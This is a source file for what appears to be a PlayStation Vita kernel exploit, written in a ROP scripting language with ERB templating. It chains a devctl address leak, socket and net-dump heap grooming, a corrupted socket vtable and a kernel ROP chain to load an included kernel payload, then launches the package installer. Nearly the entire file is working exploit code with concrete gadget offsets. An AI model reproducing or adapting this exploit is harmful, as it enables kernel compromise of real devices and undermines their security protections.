#include "common.rop"

data
{
	#include "functions.rop"

	symbol socket_d = "socket %d \n";
	symbol close_ret = "close ret 0x%x\n";
	symbol create_large = "create large 0x%x 0x%x\n";

	buffer ioctl[0x400];
	buffer crap[0x100];
	buffer our_data[0x1000];
	variable file_uid = -1;
	variable kernel_stack_base = -1;
	variable sysmem_base;

	<% need_sockets = 80 %>
	symbol need_sockets = <%= need_sockets %>;
	buffer sockets[<%= need_sockets * 4 %>];
	variable free1;
	variable tester;
	variable tmp;
	variable dump_to_free;
	variable another_hole;
	<% need_dumps = 9 %>
	buffer dumps_to_delete[<%= need_dumps * 4 %>];

	variable rop_thread_id; // thread calling vulnerable syscall
	buffer thread_info[0x80];
	buffer device_name[0x10];
	buffer command[0x10];
	buffer open_device_name[0x10];
	symbol stack_size = 0x2000;
	variable stack_base;
	buffer user_ropchain[0x100];
	variable pret;
	buffer ldm_buf[7 * 4];
	buffer mybuf[0x100];
	variable vptr;
	buffer args_buf_first[0x10];
	buffer args_buf_second[0x10];
	buffer kernel_ropchain[0x100];
	buffer krop[0x400];

	variable plant_thread_id;
	variable plant_stack_base;

	symbol stack_shellcode_offset = 0x300;
	symbol sysmem_shellcode_offset = 0x27640;
	symbol stack_rop_offset = 4;
	symbol kstack_offset_to_data = 1784;
	variable kx_loader_addr;

	// first binary payload which is small and loads the second payload
	#include "../build/kx_loader.rop"

	// actual second payload (TODO: encrypt it)
	#include "../build/second_payload.rop"
}

code : entry
{
	PRINTF("started\n");

	strcat(device_name, "sdstor0:");
	strcat(command, "xmc-lp-ign-userext");
	memset(ioctl, 0, 0x400);
	strcat(open_device_name, "molecule0:");

	sceIoOpen(open_device_name, 0, 0);
	sceIoDevctl(device_name, 5, command, 0x14, ioctl, 0x3FF); // only leak sysmem from this call
	add([ioctl+0x3D4], -0x5747);
	store(&return, sysmem_base);
	PRINTF("sysmem base: 0x%x \n", [sysmem_base]);

#if 0
	sceIoOpen("host0:stack.bin", 0x602, 6);
	store(&return, file_uid);
	PRINTF("%x\n", [file_uid]);
	sceIoWrite([file_uid], ioctl, 0x400);
	sceIoClose([file_uid]);
#endif


	// plant thread leaks kernel stack via devctl and inserts the payload there using another devctl

	sceKernelCreateThread("pln", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, plant_thread_id);
	PRINTF("plant thread %x \n", [plant_thread_id]);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([plant_thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, plant_stack_base);

	<% i = -1 %>
	store(0x14, args_buf_first+0);
	store(ioctl, args_buf_first+4);
	store(0x3FF, args_buf_first+8);

	store(0x400, args_buf_second+0);
	store(0, args_buf_second+4);
	store(0, args_buf_second+8);

	// build user ropchain -- for plant thread
	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(open_device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(0, user_ropchain + <%=i+=1%> * 4); // r1
	store(0, user_ropchain + <%=i+=1%> * 4); // r2
	store(0, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoOpen, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => sceIoOpen to populate kernel stack
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(5, user_ropchain + <%=i+=1%> * 4); // r1
	store(command, user_ropchain + <%=i+=1%> * 4); // r2
	store(args_buf_first, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoDevctl_svc, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => first devctl to leak stack/sysmem addr
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(1 * 1000 * 1000, user_ropchain + <%=i+=1%> * 4); // r0
	store(0, user_ropchain + <%=i+=1%> * 4); // r1
	store(0, user_ropchain + <%=i+=1%> * 4); // r2
	store(0, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceKernelDelayThread, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => delay to sync our two threads
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + <%=i+=1%> * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store(device_name, user_ropchain + <%=i+=1%> * 4); // r0
	store(5, user_ropchain + <%=i+=1%> * 4); // r1
	store(our_data, user_ropchain + <%=i+=1%> * 4); // r2
	store(args_buf_second, user_ropchain + <%=i+=1%> * 4); // r3
	store(sceIoDevctl_svc, user_ropchain + <%=i+=1%> * 4); // r4
	store(0, user_ropchain + <%=i+=1%> * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + <%=i+=1%> * 4); // blx r4 ; pop {r4, pc} => second devctl to plant our data into kmem
	store(0, user_ropchain + <%=i+=1%> * 4); // r4

	store(infloop, user_ropchain + <%=i+=1%> * 4); // infloop

	// copy user ropchain into user stack
	memcpy([plant_stack_base], user_ropchain, 0x100);
	// set up args for LDM user thread stack pivot
	store([plant_stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);
	sceKernelStartThread([plant_thread_id], 7 * 4, ldm_buf); // it should hang
	PRINTF("start plant rop thread 0x%x\n", &return);
	// plant thread end
	sceKernelDelayThread(100 * 1000); // sleep 0.1s


	add([ioctl+0x3C4], -0xABC);
	store(&return, kernel_stack_base);
	PRINTF("kernel stack: 0x%x (?)\n", [kernel_stack_base]);

	// set up data for kernel
	add([sysmem_base], 0x1e460); // ldm R0, {R4,R10,R12,SP,PC}
	store(&return, our_data); // future function ptr

	// layout: [ ldm_gadget ] [ kernel ropchain .... ] ... [ payload? ]
	// remember: we only have 0x400 bytes, and the less we use the better

#if 0
	// kernel ropchain
	// can do the define trick because preprocessor runs before erb
	#define NEXT kernel_ropchain+4*<%=i+=1%>
	#define STORE_OFFSET(off) \
		add([sysmem_base], off); \
		store(&return, NEXT)
	#define STORE(addr) \
		store(addr, NEXT)
	<% i = -1 %>

	STORE_OFFSET(0x2632f); // pop {r0, r1, r2, r3, r4, pc}
	STORE_OFFSET(sysmem_shellcode_offset); // r0 => shellcode dst
	add([kernel_stack_base], kstack_offset_to_data);
	add(&return, stack_shellcode_offset);
	STORE(&return); // r1 => shellcode src
	STORE(0x100); // r2 => shellcode sz
	STORE_OFFSET(0x23095); // r3 => dacr memcpy
	STORE(0); // r4
	STORE_OFFSET(0x39eb); // pc => blx r3 ; pop {r3, pc}
	STORE(0); // r3
	STORE_OFFSET(sysmem_shellcode_offset+1);

	#undef NEXT
	#undef STORE_OFFSET
	#undef STORE

	PRINTF("krop end\n");

	// kernel ropchain end
	memcpy(our_data + stack_rop_offset, kernel_ropchain, 0x100);
#endif

	add([kernel_stack_base], kstack_offset_to_data);
	add(&return, stack_shellcode_offset);
	store(&return, kx_loader_addr);

	PRINTF("krop start\n");
	#include "../build/krop.rop"
	PRINTF("krop end\n");
	memcpy(our_data + stack_rop_offset, krop, 0x300);

	// set up shellcode
	// store(0xE7FE, our_data + stack_shellcode_offset);
	memcpy(our_data + stack_shellcode_offset, kx_loader, 0x400);
	PRINTF("shellcode end\n");

	// after the plant thread wakes up, it should copy our_data into kernel stack


	// trigger rootkit
	// sceIoClose(0xb00b5);

	// set up overwritten socket structure
	add([kernel_stack_base], 1756);
	store(&return, mybuf + 6 * 4); // vptr
	add([kernel_stack_base], kstack_offset_to_data);
	add(&return, stack_rop_offset);
	store(&return, mybuf + 3 * 4); // sp
	add([sysmem_base], 0x347); // pop {pc} to kick off the ropchain
	store(&return, mybuf + 4 * 4);
	PRINTF("hacked vtable at 0x%x\n", [mybuf + 0x18]);

	// create and set up rop thread that will call vulnerable syscall
	sceKernelCreateThread("mhm", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
	store(&return, rop_thread_id);
	PRINTF("thread %x \n", [rop_thread_id]);
	store(0x7C, thread_info);
	sceKernelGetThreadInfo([rop_thread_id], thread_info);
	PRINTF("stack %x  \n", [thread_info + 0x34]);
	// some free space for function calls
	add([thread_info + 0x34], 0x1000);
	store(&return, stack_base);

	// create a lot of sockets
	<% need_sockets.times do |socket_id| %>
	socket("x", 2, 1, 0);
	store(&return, sockets + 4 * <%= socket_id %>);
	// PRINTF(socket_d, [sockets + 4 * <%= socket_id %>]);
	<% end %>

	PRINTF("enough of this\n");

	socket("sss", 2, 1, 0);
	store(&return, free1);
	
	socket("tst", 2, 7, 0);
	store(&return, tester);
	
	PRINTF("tester socket %d\n", [tester]);

	// build user ropchain
	store(ASLR::SceWebKit + 0x8dd9b5, user_ropchain + 0 * 4); // pop {r0, r1, r2, r3, r4, r5, pc}
	store([tester], user_ropchain + 1 * 4); // r0
	store(0x10007300, user_ropchain + 2 * 4); // r1
	store(0, user_ropchain + 3 * 4); // r2
	store(0, user_ropchain + 4 * 4); // r3
	store(sceNetSyscallIoctl, user_ropchain + 5 * 4); // r4
	store(0, user_ropchain + 6 * 4); // r5
	store(ASLR::SceWebKit + 0xfcdbb, user_ropchain + 7 * 4); // blx r4 ; pop {r4, pc}
	store(pret, user_ropchain + 8 * 4); // r4
	store(ASLR::SceWebKit + 0x59a9, user_ropchain + 9 * 4); // 0x000059a8 : str r0, [r4] ; pop {r4, pc}
	store(0, user_ropchain + 10 * 4); // r4
	store(infinite_loop, user_ropchain + 11 * 4); // pc
	// copy user ropchain into user stack
	memcpy([stack_base], user_ropchain, 0x100);
	// set up args for LDM user thread stack pivot
	store([stack_base], ldm_buf+5*4);
	store(pop_pc, ldm_buf+6*4);
	
	socket("tmp", 2, 1, 0);
	store(&return, tmp);

	<% need_dumps.times do |dump_id| %>
	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, dumps_to_delete + <%= 4 * dump_id %>);
	<% end %>

	sceNetDumpCreate("ddd", 0xF00, 0);
	store(&return, another_hole);
	
	sceNetDumpCreate("ddd", 0x1000, 0);
	store(&return, dump_to_free);
	
	PRINTF("dump_to_free: 0x%08X\n", [dump_to_free]);	

	PRINTF("now free some stuffs and create holes...  \n");

	// free some memory and create holes
	<% (0..need_dumps-1).step(2) do |dump_id| %>
	sceNetDumpDestroy([dumps_to_delete + <%= 4 * dump_id %>]);
	<% end %>

	sceNetDumpDestroy([another_hole]);

	<% (0xD0000).step(0xCE000, -0x100) do |dump_sz| %>
	sceNetDumpCreate("ddd", <%= dump_sz %>, 0);
	// PRINTF(create_large, &return, <%= dump_sz %>);
	<% end %>

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("another 0x%x\n", &return);

/*
	<% (0x1000).step(0x100, -0x100) do |dump_sz| %>
	sceNetDumpCreate("ddd", <%= dump_sz %>, 0);
	PRINTF("try size 0x<%= dump_sz.to_s(16) %> get 0x%x   \n", &return);
	<% end %>
*/

	sceNetDumpCreate("ddd", 0x1000, 0);
	PRINTF("last dump size=0x1000 ret=0x%x (should be=0x8041010c) \n", &return);

	sceKernelStartThread([rop_thread_id], 7 * 4, ldm_buf); // it should hang
	PRINTF("start user rop thread 0x%x\n", &return);

	sceKernelDelayThread(1500*1000);
	// free sockets
	<% (0..need_sockets-1).step(2) do |socket_id| %>
	sceNetSyscallClose([sockets + <%= 4 * socket_id %>]);
	// PRINTF(close_ret, &return);
	<% end %>

	sceNetSyscallClose([tester]);
	PRINTF("free tester 0x%x\n", &return);
	sceNetSyscallControl(0, 0x30000000, mybuf, 0xFC);
	sceNetDumpDestroy([dump_to_free]);

	sceKernelDelayThread(1*1000*1000);
	PRINTF("user thread reports %d\n", [pret]);

	add([pret], bx_lr); // on success this will remain at 0, on error it will be -22
	call_r0(0); // so we continue user rop when kernel payload triggers and crash otherwise

	sceAppMgrLaunchAppByName(0x60000, "psgm:open?titleid=NPXS10031"); // run package installer
	PRINTF("appmgr launch 0x%x\n", &return);

	infloop();
}
